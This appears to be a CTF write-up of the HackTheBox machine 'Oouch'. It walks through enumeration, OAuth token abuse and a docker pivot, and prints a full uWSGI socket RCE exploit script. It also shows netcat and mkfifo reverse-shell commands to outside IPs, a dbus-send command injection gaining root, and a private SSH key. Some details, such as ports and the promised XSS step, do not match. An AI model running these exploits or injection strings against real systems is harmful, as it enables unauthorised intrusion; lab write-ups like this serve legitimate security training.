---
title: HackTheBox-Oouch
author: a3nk17
date: 2020-08-08 
excerpt: This is relatively an insane box , It works based on Oauth2 as feom which we get account linked to qtc (admin) using a SSRF and XXS,and in This docker running and we can ssh into it.Exploiting the uwsgi to get shell and then exploiting dbus to get shell as root.
thumbnail: /assets/img/posts/oouch/info.png
categories: [HackTheBox, Retired]
tags: [linux, CMS, Bludit, sudo, npm]
---

![Info](/assets/img/posts/oouch/info.png)


Machine Information 
===================



| ID | Details | 
|-------|--------|
| Name |  Oouch| 
| Points | 40 | 
| Difficulty | Hard |
| Creator |  [QTC](https://www.hackthebox.eu/home/users/profile/103578)| 
| Out On | 14 march 2020 | 
| Retired on | 1 Aug 2020 |


The Way to Find Neo
===================


*   Finding the hidden dir `Oauth`
*   Getting the token code for the account
*   Using ssrf in Contact page linking the account with `qtc`
*   Logging in as `qtc`
*   Buy Using `BurpSuit`
*   Getting `sessionid` of `qtc` Using xss + ssrf with the application we made
*   Grab the access code
*   Find out the `ssh private keys` of user qtc on `api`
*   Logging in as `qtc`
*   `Getting User.txt`
*   Finding the docker ip running on `172.17.8.0/16` and `172.18.8.0/16`
*   exploting the `uwsgi` service running as `www-data`
*   Finding the routes.py running the dbus as root
*   Exploting the `Dbus To get a shell as root`
*   `Getting root.txt`



Enumeration 
============



```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=6/7%Time=5EDCB6BB%P=x86_64-pc-linux-gnu%r(Get
SF:Request,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h
SF:1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Requ
SF:est\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>
SF:Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\
SF:r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Autho
SF:rization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Recon
======

The open ports shown are **21**, **22**, **5000** and **8000**. Nmap tells us that anonymous FTP-access is allowed. Furthermore, we can see from the nmap scan result that http is running on port 5000. Let us quickly check out the project.txt file, that nmap has shown us for FTP.


FTP
====

I did `anonymous` login and it says `qtc's development server` maybe it can be a valid user and found a `project.txt` file there. Downloaded that to my machine.


```bash
root@kali:~# ftp 10.10.10.177 
Connected to 10.10.10.177.
220 qtc's development server
Name (10.10.10.177:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (1.1126 MB/s)
```

`project.txt`


```bash
root@kali:~/CTF/HTB/Boxes/Oouch# cat project.txt 
Flask -> Consumer
Django -> Authorization Server
```


WebSte Enumeration
==================

After see in the website, The port `5000` is open, so we will `REGISTER` into account ,And after login we get ooucch   page 

![](/assets/img/posts/oouch/signin.png]

![](/assets/img/posts/oouch/4.png]


We Fount Nothing Intresting  There so Go back to `Gobuster` start diging,

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/08 09:49:48 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
===============================================================
2020/06/08 09:57:39 Finished
===============================================================
```

we got `outh`  dir


![](/assets/img/posts/oouch/5.png]


It reveals a new subdomain `consumer.oouch.htb` so Added it to `/etc/hosts`

When I open [`http://consumer.oouch.htb:5000/oauth/connect`](http://consumer.oouch.htb:5000/oauth/connect), It redirects me to some another subdomain `authorization.oouch.htb:8000` so Added it to my `/etc/hosts`

Once we go back to the connect page, we can authorize the application as follows.

![](/assets/img/posts/oouch/6.png]

after that we will log  as `qtc'

We already got the client_id and client_secret so I can get the access_token.


```bash
root@kali:~/CTF/HTB/Boxes/Oouch# curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-Type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=4muao51xk7wSAAMFe970Cr80vQaO8DusCEQW81fG&client_secret=IVehRabE8UzG9EQrzDUCy7gfupOlL15y5RKc10CeWFJT8f9zWjf3CylrUriGwEatsPvjOZyoIfagE1hF4GgKAEV9ETNuZ2N5cUx5kEMWeuTaGVSl89gzPFwoJeEE0vEI" -L -s

{"access_token": "vcvGfw7s9nDlRDedGKFgEOsDfw127H", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
```

`SSH Key`

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Time To Get USER
=================

After getting Ssh , login in ang get the `User.txt`

```bash
root@kali:~/CTF/HTB/Boxes/Oouch# chmod 600 id_rsa 
root@kali:~/CTF/HTB/Boxes/Oouch# ssh -i id_rsa qtc@oouch.htb
The authenticity of host 'oouch.htb (10.10.10.177)' can't be established.
ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'oouch.htb,10.10.10.177' (ED25519) to the list of known hosts.
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
qtc@oouch:~$ ls
user.txt
qtc@oouch:~$ cat user.txt
```

Got user.txt

```bash
qtc@oouch:~$ cat user.txt
ba7--------------------------d14
qtc@oouch:~$ 
```

Privilege escalation
=====================

Login to docker
----------------

Tried to running various `monitoring` scripts but no success.

Running `ps -aux` and `ss` gave me some interesting results that there is a docker running on the machine.

I did a command `ip a`.It `Displays info about all network interfaces` and also about the docker and its interfaces related to it.And we got the ip range on which the docker and related service is running

```bash
qtc@oouch:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:ba:81 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.177/24 brd 10.10.10.255 scope global ens34
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:ba81/64 scope global dynamic mngtmpaddr 
       valid_lft 86117sec preferred_lft 14117sec
    inet6 fe80::250:56ff:feb9:ba81/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:66:92:e9:2c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:9f:43:75:f5 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:9fff:fe43:75f5/64 scope link 
       valid_lft forever preferred_lft forever
6: veth97fb0c5@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    link/ether 12:49:7c:41:00:bb brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::1049:7cff:fe41:bb/64 scope link 
       valid_lft forever preferred_lft forever
8: vethdd01113@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    link/ether 2a:ff:b0:3c:04:92 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::28ff:b0ff:fe3c:492/64 scope link 
       valid_lft forever preferred_lft forever
10: veth5dad994@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    link/ether e6:bc:82:f1:c5:04 brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::e4bc:82ff:fef1:c504/64 scope link 
       valid_lft forever preferred_lft forever
12: vetha1db8fd@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    link/ether 02:27:bb:85:15:5f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::27:bbff:fe85:155f/64 scope link 
       valid_lft forever preferred_lft forever
       ```
       
       Tried login with port `170.17.0.1` to `17.17.0.56` Hard Luck Mostly connections are closed
       
```bash
qtc@oouch:~$ ssh -i .ssh/id_rsa qtc@172.17.0.2
ssh: connect to host 172.17.0.2 port 22: No route to host
```

And likewise i tried ips till `172.17.0.10` but no success

Then i just moved to another interface and got success on `172.18.0.2` and logged in to docker


```bash
	

qtc@oouch:~$ ssh -i .ssh/id_rsa qtc@172.18.0.2
The authenticity of host '172.18.0.2 (172.18.0.2)' can't be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.18.0.2' (ED25519) to the list of known hosts.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@aeb4525789d8:~$ 
```

Now if we go to `/` dir there is a dir called `code`

```bash
drwxr-xr-x   4 root root 4096 Feb 11 17:34 code
```

The web services were running from the docker on port **5000** and **8000** `flask and django`

If we look into the code

```bash
def contact():
    '''
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.
    The messages are scanned for valid url's and these urls are saved to a file on disk. A cronjob will view the files regulary and
    invoke requests on the corresponding urls.

    Parameters:
        None

    Returns:
        render                (Render)                  Renders the contact page.
    '''
    # First we need to load the contact form
    form = ContactForm()

    # If the form was already submitted, we process the contents
    if form.validate_on_submit():

        # First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')

        # The regex defined at the beginning of this file checks for valid urls
        url = regex.search(form.textfield.data)
        if url:

            # If an url was found, we try to save it to the file /code/urls.txt
            try:
                with open("/code/urls.txt", "a") as url_file:
                    print(url.group(0), file=url_file)
            except:
                print("Error while openeing 'urls.txt'")

        # In any case, we inform the user that has message has been sent
        return render_template('contact.html', title='Contact', send=True, form=form)

    # Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user
    return render_template('contact.html', title='Contact', send=False, form=form)
 ```
    
   
   In a nutshell, when the `XSS filter` is triggered, the application uses the `REMOTE_ADDR` parameter to send it through the `dbus interface` to the upstream iptables command. We can’t spoof or modify this `REMOTE_ADDR` variable remotely so we’ll have to exploit this another way.
    
    
The `uwsgi.ini` file shows that a UNIX socket is used to communicate between the webserver and the flask application:
    
    
    
 Exploiting uwsgi service
 ===========================
  
  
And the service `uwsgi` is running as `www-data`
    
    
```bash
qtc@aeb4525789d8:/code$ ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   5488  3116 ?        Ss   08:29   0:00 /bin/bash ./start.sh
root        14  0.0  0.0  15852  2924 ?        Ss   08:29   0:00 /usr/sbin/sshd
root        27  0.0  0.0  10476   844 ?        Ss   08:29   0:00 nginx: master process /usr/sbin/nginx
www-data    28  0.0  0.0  11264  3732 ?        S    08:29   0:00 nginx: worker process
www-data    29  0.0  0.0  11264  3732 ?        S    08:29   0:00 nginx: worker process
www-data    30  0.3  1.1  57492 46588 ?        S    08:29   0:02 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    31  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    32  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    33  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    34  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    35  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    36  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    37  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    38  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    39  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
www-data    40  0.0  0.9  57492 37260 ?        S    08:29   0:00 uwsgi --ini uwsgi.ini --chmod-sock=666
```

The `uwsgi.ini` file shows that a `UNIX socke`t is used to communicate between the `webserver` and the `flask application`:

```bash
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

We can write using the uwsgi protocol directly to the socket and manipulate the values. The code below is an ugly hack put together from some examples found online. The payload I used here sets the SUID bit on `/bin/bash`: `$(chmod u+s /bin/bash)`


```python
#!/usr/bin/python

import sys
import socket
import argparse
import binascii
import requests

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else binascii.hexlify(s)
    return s[::-1]

def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result

def parse_addr(addr, default_port=None):
    port = default_port
    if isinstance(addr, str):
        if addr.isdigit():
            addr, port = '', addr
        elif ':' in addr:
            addr, _, port = addr.partition(':')
    elif isinstance(addr, (list, tuple, set)):
        addr, port = addr
    port = int(port) if port else port
    return (addr or '127.0.0.1', port)

def get_host_from_url(url):
    if '//' in url:
        url = url.split('//', 1)[1]
    host, _, url = url.partition('/')
    return (host, '/' + url)

def fetch_data(uri, payload=None, body=None):
    if 'http' not in uri:
        uri = 'http://' + uri
    s = requests.Session()
    # s.headers['UWSGI_FILE'] = payload
    if body:
        import urlparse
        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))
        d = s.post(uri, data=body_d)
    else:
        d = s.get(uri)

    return {
        'code': d.status_code,
        'text': d.text,
        'header': d.headers
    }

def ask_uwsgi(addr_and_port, mode, var, body=''):
    if mode == 'tcp':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(parse_addr(addr_and_port))
    elif mode == 'unix':
        s = socket.socket(socket.AF_UNIX)
        s.connect(addr_and_port)
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
    response = []
    # Actually we dont need the response, it will block if we run any commands.
    # So I comment all the receiving stuff. 
    # while 1:
    #     data = s.recv(4096)
    #     if not data:
    #         break
    #     response.append(data)
    s.close()
    return b''.join(response).decode('utf8')

def curl(mode, addr_and_port, payload, target_url):
    host, uri = get_host_from_url(target_url)
    path, _, qs = uri.partition('?')
    if mode == 'http':
        return fetch_data(addr_and_port+uri, payload)
    elif mode == 'tcp':
        host = host or parse_addr(addr_and_port)[0]
    else:
        host = addr_and_port
    var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': path,
        'REQUEST_URI': uri,
        'QUERY_STRING': qs,
        'SERVER_NAME': host,
        'HTTP_HOST': host,
        'UWSGI_FILE': payload,
        'SCRIPT_NAME': target_url
    }
    return ask_uwsgi(addr_and_port, mode, var)

def main(*args):
    desc = """
    This is a uwsgi client & RCE exploit.
    Last modifid at 2018-01-30 by wofeiwo@80sec.com
    """
    elog = "Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111>/tmp/abc\""
    
    parser = argparse.ArgumentParser(description=desc, epilog=elog)

    parser.add_argument('-m', '--mode', nargs='?', default='tcp',
                        help='Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.',
                        dest='mode', choices=['http', 'tcp', 'unix'])

    parser.add_argument('-u', '--uwsgi', nargs='?', required=True,
                        help='Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock',
                        dest='uwsgi_addr')

    parser.add_argument('-c', '--command', nargs='?', required=True,
                        help='Command: The exploit command you want to execute, must have this.',
                        dest='command')

    if len(sys.argv) < 2:
        parser.print_help()
        return
    args = parser.parse_args()
    if args.mode.lower() == "http":
        print("[-]Currently only tcp/unix method is supported in RCE exploit.")
        return
    payload = 'exec://' + args.command + "; echo test" # must have someting in output or the uWSGI crashs.
    print("[*]Sending payload.")
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))

if __name__ == '__main__':
    main()
```

[uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

The script needs some modifications on the line `18-19` with our requirements.

Remove following Code

```bash
if sys.version_info[0] == 3: import bytes
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
```
to This

```bash
s = bytes.fromhex(s)
```

There are two ways to run the exploit with `url` and `unix` mode The socket file is saved in `/tmp/uwsgi.socket`.

```bash
qtc@aeb4525789d8:/tmp$ ls -la
total 8
drwxrwxrwt 1 root     root     4096 Mar 26 08:29 .
drwxr-xr-x 1 root     root     4096 Feb 25 12:33 ..
srw-rw-rw- 1 www-data www-data    0 Mar 26 08:29 uwsgi.socket
```
Since we cant access docker from our attacking machine so we need to transfer `netcat` and `exploit.py` to oouch machine first and then move them to docker using `scp`.

```bash
qtc@oouch:~$ scp -i .ssh/id_rsa exploit.py  qtc@172.18.0.2:/tmp
exploit.py                                    100% 4333     5.4MB/s   00:00    
qtc@oouch:~$ scp -i .ssh/id_rsa nc  qtc@172.18.0.2:/tmp
nc                                            100%   35KB  22.2MB/s   00:00    
```

Time too run The `Exploits` and get the Shell on our terminal

```bash
qtc@aeb4525789d8:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "/tmp/nc -e /bin/bash 172.18.0.1 1234"
[*]Sending payload.

qtc@aeb4525789d8:/tmp
```
Grab NutShell as www-data
---------------------------

```bash
qtc@oouch:~$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 41652
whoami
www-data
```


D-Bus Exploitation
--------------------

[http://www.kaizou.org/2014/06/dbus-command-line.html](http://www.kaizou.org/2014/06/dbus-command-line.html)

[https://linux.die.net/man/1/dbus-send](https://linux.die.net/man/1/dbus-send)

run `debus-send`

```python
www-daat@oouch:~$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.15.135 2345 >/tmp/.0;"
```

Reverse Back To terminal
--------------------------

```python
root@kali:~/CTF/HTB/Boxes/Oouch# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.177] 38992
bash: cannot set terminal process group (2717): Inappropriate ioctl for device
bash: no job control in this shell
root@oouch:/root# whoami
whoami
root
```

Rooted
=======

```bash
root@oouch:/root# cat root.txt
cat root.txt
e23--------------------------fd7d
root@oouch:/root#
```



And Finally Neo Got The Rabbit..!


###Thank You
